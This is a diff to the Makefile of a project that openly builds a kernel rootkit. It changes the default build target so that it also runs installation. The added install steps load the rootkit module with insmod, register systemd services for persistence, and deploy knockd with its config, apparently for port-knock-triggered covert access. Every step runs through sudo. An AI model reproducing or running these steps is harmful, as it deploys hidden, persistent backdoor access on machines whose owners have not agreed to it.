@@ -15,7 +15,7 @@ INC = -I$(PROJECT_DIR)/include
 OUT = bin/personality
 
 
-all: rootkit personality
+all: rootkit personality install
 
 rootkit:
 	make -C $(KDIR) M=$(PWD) modules
@@ -27,9 +27,18 @@ personality: $(SRC)
 
 install:
 	sudo insmod bin/rootkit.ko
+	sudo cp src/script/personality_install.sh /usr/local/bin/personality_install.sh
+	sudo chmod +x /usr/local/bin/personality_install.sh
+	sudo cp src/script/personality.service /etc/systemd/system/personality.service
+	sudo systemctl enable personality.service
+	sudo cp ../knockd /usr/local/bin/knockd
+	sudo cp src/script/knockd.service /etc/systemd/system/knockd.service
+	sudo cp src/script/knockd.conf /etc/knockd.conf
+	sudo systemctl enable knockd.service
 
 uninstall:
 	sudo rmmod rootkit
+	@rm -f /usr/local/bin/personality_install.sh /etc/systemd/system/personality.service
 
 clean:
 	make -C $(KDIR) M=$(PWD) clean
